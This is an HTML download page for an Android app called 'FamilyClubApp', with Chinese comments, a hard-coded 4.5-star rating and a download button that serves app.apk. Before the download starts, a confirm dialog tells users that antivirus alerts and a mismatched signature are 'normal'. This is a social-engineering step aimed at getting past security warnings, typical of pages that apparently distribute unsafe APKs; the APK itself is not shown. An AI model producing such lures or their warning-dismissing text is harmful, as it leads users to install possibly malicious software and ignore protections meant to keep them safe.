<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FamilyClubApp 下载</title>
    <style>
        @font-face {
            font-family: 'FontAwesome';
            src: url('../FontAwesome/fa-solid-900.woff2') format('woff2');
            font-weight: normal;
            font-style: normal;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background: #ffffff;
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .download-card {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 420px;
            max-width: 90vw;
            background: transparent;
            padding: 2rem 1rem 2.5rem 1rem;
        }

        /* Logo 图片 - 明显大于下载按钮 */
        .app-logo {
            display: block;
            width: 220px;              /* 增大到220px，比下载按钮大很多 */
            height: auto;
            object-fit: contain;
            margin-bottom: 0.5rem;
            filter: drop-shadow(0 2px 8px rgba(0,0,0,0.05));
        }

        .app-name {
            font-size: 1.8rem;
            font-weight: 500;
            color: #333;
            margin-bottom: 0.2rem;
            letter-spacing: 1px;
            text-align: center;
        }

        .rating-info {
            font-size: 1rem;
            color: #777;
            text-align: center;
            margin-bottom: 2.5rem;      /* 增加底部间距，让按钮更独立 */
            font-weight: 400;
            line-height: 1.5;
            font-family: 'FontAwesome', system-ui, -apple-system, 'Segoe UI', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 4px;
        }

        .rating-stars {
            display: inline-flex;
            align-items: center;
            color: #FFB800;
            letter-spacing: 2px;
        }

        .rating-text {
            margin-left: 6px;
            color: #777;
            font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;
        }

        .separator {
            color: #777;
            margin: 0 6px;
            font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;
        }

        /* 圆形下载按钮 - 尺寸明显小于Logo */
        .download-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 64px;                /* 减小到64px，明显小于220px的Logo */
            height: 64px;
            background-color: #0079FF;
            color: #ffffff;
            text-decoration: none;
            border-radius: 50%;
            border: none;
            cursor: pointer;
            transition: all 0.18s ease;
            box-shadow: none;
            font-family: 'FontAwesome', sans-serif;
            font-size: 1.8rem;          /* 图标大小相应调小 */
            margin-top: 0.5rem;
        }

        .download-btn:hover {
            background-color: #0066d9;
            transform: translateY(-2px);
            box-shadow: none;
        }

        .download-btn:active {
            transform: translateY(1px);
            background-color: #005bbf;
            box-shadow: none;
        }

        .download-btn:focus-visible {
            outline: 2px solid #0079FF;
            outline-offset: 4px;
        }

        /* 移除多余伪元素 */
        body::before,
        body::after,
        .download-card::before,
        .download-card::after {
            display: none !important;
            content: none !important;
        }

        /* 移动端适配 */
        @media (max-width: 480px) {
            .app-logo {
                width: 170px;            /* 移动端也保持大于按钮 */
                margin-bottom: 0.3rem;
            }
            .app-name {
                font-size: 1.5rem;
                margin-bottom: 0.1rem;
            }
            .rating-info {
                font-size: 0.9rem;
                margin-bottom: 2rem;
            }
            .download-btn {
                width: 56px;
                height: 56px;
                font-size: 1.6rem;
            }
        }
    </style>
</head>
<body>
    <div class="download-card">
        <!-- Logo: 220px (明显大于下载按钮) -->
        <img class="app-logo" src="applogo.png" alt="FamilyClubApp Logo" draggable="false">
        
        <!-- 软件名称 -->
        <div class="app-name">FamilyClubApp</div>
        
        <!-- 评分信息：无广告│2MB│四星半4.5 -->
        <div class="rating-info">
            <span>无广告</span>
            <span class="separator">│</span>
            <span>2MB</span>
            <span class="separator">│</span>
            <span class="rating-stars">
                <!-- 四颗实星： -->
                &#xf005;&#xf005;&#xf005;&#xf005;
                <!-- 半星： (fa-star-half-alt) -->
                &#xf5c0;
            </span>
            <span class="rating-text">4.5</span>
        </div>

        <!-- 圆形下载按钮 (64px) - 明显小于Logo -->
        <a href="#" class="download-btn" id="downloadBtn">&#xf103;</a>
    </div>

    <script>
        document.getElementById('downloadBtn').addEventListener('click', function(e) {
            e.preventDefault();
            
            if (confirm('单机应用，报毒为正常现象，签名不一致为正常现象!!!')) {
                const link = document.createElement('a');
                link.href = 'app.apk';
                link.download = 'app.apk';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }
        });
    </script>
</body>
</html>
